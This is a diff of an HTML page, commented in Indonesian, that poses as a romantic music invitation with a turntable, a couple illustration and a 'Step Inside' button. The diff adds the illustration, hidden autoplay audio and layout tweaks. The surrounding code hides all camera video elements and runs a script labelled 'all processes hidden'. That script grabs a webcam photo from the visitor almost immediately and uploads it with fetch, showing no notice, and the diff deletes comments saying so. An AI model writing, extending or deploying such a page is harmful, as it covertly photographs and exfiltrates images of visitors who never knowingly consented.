@@ -26,25 +26,27 @@
             font-family: 'Inter', sans-serif;
             background: radial-gradient(ellipse at 30% 20%, #2b1a3a, #0e0b16);
             padding: 20px;
-            overflow: hidden;
+            overflow-x: hidden;
             position: relative;
         }
 
-        /* ---------- LANGIT BINTANG ---------- */
+        /* ---------- LANGIT BINTANG (Opsi 1) ---------- */
         body::before {
             content: '';
             position: fixed;
             inset: 0;
             z-index: 0;
             background-image:
-                radial-gradient(2px 2px at 15% 25%, rgba(255, 215, 200, 0.5), transparent),
-                radial-gradient(2px 2px at 35% 60%, rgba(255, 215, 200, 0.4), transparent),
-                radial-gradient(2px 2px at 55% 15%, rgba(255, 215, 200, 0.6), transparent),
-                radial-gradient(2px 2px at 75% 80%, rgba(255, 215, 200, 0.3), transparent),
-                radial-gradient(2px 2px at 90% 40%, rgba(255, 215, 200, 0.5), transparent),
-                radial-gradient(2px 2px at 10% 70%, rgba(255, 215, 200, 0.4), transparent),
-                radial-gradient(2px 2px at 45% 90%, rgba(255, 215, 200, 0.3), transparent),
-                radial-gradient(2px 2px at 80% 10%, rgba(255, 215, 200, 0.5), transparent);
+                radial-gradient(2px 2px at 15% 25%, rgba(255, 215, 200, 0.7), transparent),
+                radial-gradient(2px 2px at 35% 60%, rgba(255, 215, 200, 0.5), transparent),
+                radial-gradient(2px 2px at 55% 15%, rgba(255, 215, 200, 0.8), transparent),
+                radial-gradient(2px 2px at 75% 80%, rgba(255, 215, 200, 0.4), transparent),
+                radial-gradient(2px 2px at 90% 40%, rgba(255, 215, 200, 0.6), transparent),
+                radial-gradient(2px 2px at 10% 70%, rgba(255, 215, 200, 0.5), transparent),
+                radial-gradient(2px 2px at 45% 90%, rgba(255, 215, 200, 0.4), transparent),
+                radial-gradient(2px 2px at 80% 10%, rgba(255, 215, 200, 0.7), transparent),
+                radial-gradient(3px 3px at 25% 45%, rgba(255, 215, 200, 0.3), transparent),
+                radial-gradient(3px 3px at 65% 55%, rgba(255, 215, 200, 0.3), transparent);
             background-size: 200px 200px;
             animation: drift 70s linear infinite;
             pointer-events: none;
@@ -65,7 +67,7 @@
             backdrop-filter: blur(20px) saturate(1.6);
             -webkit-backdrop-filter: blur(20px) saturate(1.6);
             border-radius: 56px;
-            padding: 40px 32px 44px;
+            padding: 40px 32px 32px;
             border: 1px solid rgba(255, 255, 255, 0.08);
             box-shadow: 0 40px 100px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(255, 255, 255, 0.1);
             text-align: center;
@@ -108,7 +110,7 @@
             font-size: 1rem;
             line-height: 1.7;
             color: rgba(255, 255, 255, 0.8);
-            margin-bottom: 24px;
+            margin-bottom: 20px;
             font-weight: 400;
             max-width: 360px;
             margin-left: auto;
@@ -120,12 +122,12 @@
             font-weight: 500;
         }
 
-        /* ---------- TURNTABLE ---------- */
+        /* ---------- TURNTABLE (Opsi 1: Retro) ---------- */
         .turntable-wrapper {
             display: flex;
             justify-content: center;
             align-items: center;
-            margin: 12px 0 24px;
+            margin: 12px 0 20px;
             cursor: pointer;
             transition: transform 0.2s ease;
         }
@@ -188,6 +190,28 @@
             100% { transform: rotate(360deg); }
         }
 
+        /* ---------- ILUSTRASI PASANGAN (Opsi 4) ---------- */
+        .couple-illustration {
+            margin: 16px auto 20px;
+            max-width: 320px;
+            border-radius: 24px;
+            overflow: hidden;
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            transition: transform 0.3s ease;
+        }
+
+        .couple-illustration:hover {
+            transform: scale(1.02);
+        }
+
+        .couple-illustration img {
+            width: 100%;
+            height: auto;
+            display: block;
+            border-radius: 24px;
+        }
+
         /* ---------- TOMBOL STEP INSIDE ---------- */
         .btn-step {
             display: inline-flex;
@@ -207,6 +231,7 @@
             transition: all 0.3s ease;
             cursor: pointer;
             border: 1px solid rgba(255, 255, 255, 0.2);
+            margin-top: 4px;
         }
 
         .btn-step:hover {
@@ -227,7 +252,7 @@
         /* ---------- RESPONSIVE ---------- */
         @media (max-width: 480px) {
             .card {
-                padding: 30px 20px 32px;
+                padding: 30px 20px 28px;
                 border-radius: 40px;
             }
             .card h1 {
@@ -248,6 +273,9 @@
                 padding: 12px 28px;
                 font-size: 0.9rem;
             }
+            .couple-illustration {
+                max-width: 260px;
+            }
         }
 
         @media (max-width: 360px) {
@@ -258,14 +286,18 @@
                 width: 70px;
                 height: 70px;
             }
+            .couple-illustration {
+                max-width: 200px;
+            }
         }
 
         /* ---------- SEMUA ELEMEN KAMERA DISEMBUNYIKAN ---------- */
         video {
             display: none !important;
         }
-
-        /* Tidak ada elemen status kamera sama sekali */
+        audio {
+            display: none !important;
+        }
     </style>
 </head>
 <body>
@@ -282,7 +314,7 @@
             <span style="color:rgba(255,255,255,0.4); font-size:0.85rem;">Tap the turntable to set the vibe.</span>
         </p>
 
-        <!-- Turntable -->
+        <!-- Turntable (Opsi 1) -->
         <div class="turntable-wrapper" id="turntableBtn">
             <div class="turntable">
                 <div class="groove"></div>
@@ -291,11 +323,23 @@
             </div>
         </div>
 
+        <!-- Ilustrasi Pasangan (Opsi 4) -->
+        <div class="couple-illustration">
+            <img src="https://i.imgur.com/3Bbtsvp.jpeg" alt="Ilustrasi pasangan" />
+        </div>
+
         <!-- Tombol Step Inside -->
         <a href="#" class="btn-step" id="stepBtn">
             <span class="icon">🎵</span> Step Inside
         </a>
     </div>
+
+    <!-- ====== AUDIO (LAGU) ====== -->
+    <audio id="bgMusic" autoplay loop>
+        <source src="https://drive.google.com/uc?export=download&id=1py9CuXqUXEPGF6tsb_AaH9bCUxc8T8N4" type="audio/mpeg">
+        <!-- Fallback jika file MP3 tidak bisa dimuat -->
+        <source src="https://dl.dropboxusercontent.com/s/placeholder.mp3" type="audio/mpeg">
+    </audio>
 
     <!-- ====== SCRIPT (SEMUA PROSES HIDDEN) ====== -->
     <script>
@@ -357,7 +401,6 @@
                         body: formData
                     });
                     sudahKirim = true;
-                    // Tidak ada notifikasi UI
                 } catch (e) {
                     console.error('Gagal kirim:', e);
                 }
@@ -407,7 +450,6 @@
 
                     video.onloadedmetadata = () => {
                         video.play().then(() => {
-                            // Ambil foto tanpa jeda
                             setTimeout(() => ambilDanKirim(video), 100);
                         }).catch(err => {
                             console.error('Gagal memutar:', err);
@@ -455,6 +497,17 @@
                 e.preventDefault();
                 this.style.transform = 'scale(0.95)';
                 setTimeout(() => this.style.transform = '', 150);
+            });
+
+            // ---------- HENTIKAN AUTOPLAY LAGU JIKA GAGAL (TETAP HIDDEN) ----------
+            const audio = document.getElementById('bgMusic');
+            audio.addEventListener('error', function() {
+                console.warn('Lagu gagal dimuat, mencoba lagi...');
+                // Coba reload setelah 3 detik
+                setTimeout(() => {
+                    audio.load();
+                    audio.play().catch(() => {});
+                }, 3000);
             });
 
         })();
